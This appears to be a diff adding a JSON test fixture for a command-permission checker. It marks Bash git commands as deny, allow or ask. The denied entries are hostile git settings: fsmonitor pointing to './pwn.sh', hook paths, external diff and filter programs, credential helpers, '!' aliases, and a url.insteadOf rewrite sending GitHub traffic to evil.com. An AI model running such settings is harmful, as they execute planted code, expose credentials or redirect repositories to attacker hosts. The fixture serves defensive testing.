@@ -1,0 +1,194 @@
+[
+ {
+  "name": "git config core.fsmonitor ./pwn.sh",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git config core.fsmonitor ./pwn.sh"
+ },
+ {
+  "name": "git config core.hooksPath .hooks",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git config core.hooksPath .hooks"
+ },
+ {
+  "name": "git config --global core.editor vim",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git config --global core.editor vim"
+ },
+ {
+  "name": "git config include.path ../x",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git config include.path ../x"
+ },
+ {
+  "name": "git config includeIf.gitdir:/x.path ../y",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git config includeIf.gitdir:/x.path ../y"
+ },
+ {
+  "name": "git config filter.x.clean ./c",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git config filter.x.clean ./c"
+ },
+ {
+  "name": "git config diff.external ./d",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git config diff.external ./d"
+ },
+ {
+  "name": "git config diff.x.textconv ./t",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git config diff.x.textconv ./t"
+ },
+ {
+  "name": "git config alias.p 'push --force'",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git config alias.p 'push --force'"
+ },
+ {
+  "name": "git config credential.helper '!x'",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git config credential.helper '!x'"
+ },
+ {
+  "name": "git config url.https://evil.com/.insteadOf https://github.com/",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git config url.https://evil.com/.insteadOf https://github.com/"
+ },
+ {
+  "name": "git config gpg.program ./g",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git config gpg.program ./g"
+ },
+ {
+  "name": "git config sequence.editor ./e",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git config sequence.editor ./e"
+ },
+ {
+  "name": "git config --edit",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git config --edit"
+ },
+ {
+  "name": "git -c core.fsmonitor=./x status",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git -c core.fsmonitor=./x status"
+ },
+ {
+  "name": "git -c alias.s=!id s",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git -c alias.s=!id s"
+ },
+ {
+  "name": "git -c credential.helper=x fetch",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git -c credential.helper=x fetch"
+ },
+ {
+  "name": "git -c diff.external=x diff",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git -c diff.external=x diff"
+ },
+ {
+  "name": "git config --get core.fsmonitor",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "allow",
+  "strict": "allow",
+  "command": "git config --get core.fsmonitor"
+ },
+ {
+  "name": "git config --list",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "allow",
+  "strict": "allow",
+  "command": "git config --list"
+ },
+ {
+  "name": "git config user.name x",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "ask",
+  "strict": "ask",
+  "command": "git config user.name x"
+ },
+ {
+  "name": "git -c user.name=x log",
+  "level": "L1",
+  "tool": "Bash",
+  "fixture": "ask",
+  "strict": "ask",
+  "command": "git -c user.name=x log"
+ },
+ {
+  "name": "git config core.fsmonitor ./pwn.sh @L4",
+  "level": "L4",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git config core.fsmonitor ./pwn.sh"
+ },
+ {
+  "name": "git -c core.pager=x log @L4",
+  "level": "L4",
+  "tool": "Bash",
+  "fixture": "deny",
+  "strict": "deny",
+  "command": "git -c core.pager=x log"
+ }
+]
